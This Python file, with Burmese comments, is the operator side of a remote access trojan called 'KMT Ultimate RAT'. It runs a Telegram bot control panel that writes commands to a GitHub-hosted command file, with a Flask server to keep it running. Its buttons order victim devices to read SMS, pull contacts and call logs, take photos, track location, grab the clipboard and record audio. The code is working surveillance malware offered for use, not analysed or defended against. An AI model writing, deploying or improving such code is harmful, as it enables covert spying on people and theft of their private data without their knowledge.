import os
import threading
import telebot
import requests
import base64
from flask import Flask

# 1. Flask App (Render အတွက် Port 10000 ဖွင့်ရန်)
app = Flask(__name__)

@app.route('/')
def home():
    app_status = "KMT Ultimate RAT Bot is running live!"
    return app_status

# 2. Telegram & GitHub Setup
TOKEN = os.environ.get('BOT_TOKEN')
GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN')
REPO_OWNER = "qqq1234ttttt"
REPO_NAME = "KMT-All-Software-Rat-Control"
FILE_PATH = "command.txt"

bot = telebot.TeleBot(TOKEN)

# GitHub သို့ Command ပို့သည့် Function
def update_github(command):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
    headers = {
        "Authorization": f"Bearer {GITHUB_TOKEN}", 
        "Accept": "application/vnd.github+json"
    }
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        sha = response.json()['sha']
        content_encoded = base64.b64encode(command.encode('ascii')).decode('ascii')
        
        data = {
            "message": f"Execute {command}",
            "content": content_encoded,
            "sha": sha
        }
        requests.put(url, headers=headers, json=data)

# 3. Telegram Control Panel (ခလုတ်များ အစုံအလင်)
@bot.message_handler(commands=['start', 'panel'])
def send_control_panel(message):
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    
    btn_info = telebot.types.InlineKeyboardButton("📱 Device Info", callback_data="cmd_info")
    btn_sms = telebot.types.InlineKeyboardButton("✉️ Read SMS", callback_data="cmd_sms")
    btn_contacts = telebot.types.InlineKeyboardButton("📇 Get Contacts", callback_data="cmd_contacts")
    btn_cam = telebot.types.InlineKeyboardButton("📸 Take Photo", callback_data="cmd_cam")
    btn_loc = telebot.types.InlineKeyboardButton("📍 Get Location", callback_data="cmd_loc")
    btn_clipboard = telebot.types.InlineKeyboardButton("📋 Clipboard", callback_data="cmd_clipboard")
    btn_calls = telebot.types.InlineKeyboardButton("📞 Call Logs", callback_data="cmd_calls")
    btn_mic = telebot.types.InlineKeyboardButton("🎤 Record Audio", callback_data="cmd_mic")
    btn_clear = telebot.types.InlineKeyboardButton("🧹 Clear / IDLE", callback_data="cmd_clear")
    
    markup.add(btn_info, btn_sms, btn_contacts, btn_cam, btn_loc, btn_clipboard, btn_calls, btn_mic, btn_clear)
    
    bot.send_message(
        message.chat.id, 
        "🔥 **KMT ULTIMATE RAT CONTROL PANEL** 🔥\n\nလိုအပ်သော အမိန့် (Command) ကို ရွေးချယ်ပါ:", 
        reply_markup=markup,
        parse_mode="Markdown"
    )

# 4. Callback Queries (ခလုတ်များ အလုပ်လုပ်ပုံ)
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    
    commands_map = {
        "cmd_info": ("CMD: GET_INFO", "📱 Device Info တောင်းဆိုသည့် အမိန့် ပို့ပြီးပါပြီ။"),
        "cmd_sms": ("CMD: READ_SMS", "✉️ SMS ဖတ်ရန် အမိန့် ပို့ပြီးပါပြီ။"),
        "cmd_contacts": ("CMD: GET_CONTACTS", "📇 Contacts ယူရန် အမိန့် ပို့ပြီးပါပြီ။"),
        "cmd_cam": ("CMD: TAKE_PHOTO", "📸 ဓာတ်ပုံရိုက်ရန် အမိန့် ပို့ပြီးပါပြီ။"),
        "cmd_loc": ("CMD: GET_LOCATION", "📍 တည်နေရာယူရန် အမိန့် ပို့ပြီးပါပြီ။"),
        "cmd_clipboard": ("CMD: GET_CLIPBOARD", "📋 Clipboard စာသား ယူရန် အမိန့် ပို့ပြီးပါပြီ။"),
        "cmd_calls": ("CMD: GET_CALLS", "📞 Call Logs မှတ်တမ်း ယူရန် အမိန့် ပို့ပြီးပါပြီ။"),
        "cmd_mic": ("CMD: RECORD_AUDIO", "🎤 အသံဖမ်းရန် အမိန့် ပို့ပြီးပါပြီ။"),
        "cmd_clear": ("IDLE", "🧹 Command ကို IDLE သို့ ပြောင်းလိုက်ပါပြီ။")
    }
    
    if call.data in commands_map:
        cmd_text, msg_text = commands_map[call.data]
        update_github(cmd_text)
        bot.answer_callback_query(call.id, "Command Executed!")
        bot.send_message(chat_id, msg_text)

# 5. Background Thread & Flask Run
def run_bot():
    bot.infinity_polling()

if __name__ == "__main__":
    t = threading.Thread(target=run_bot)
    t.start()
    
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
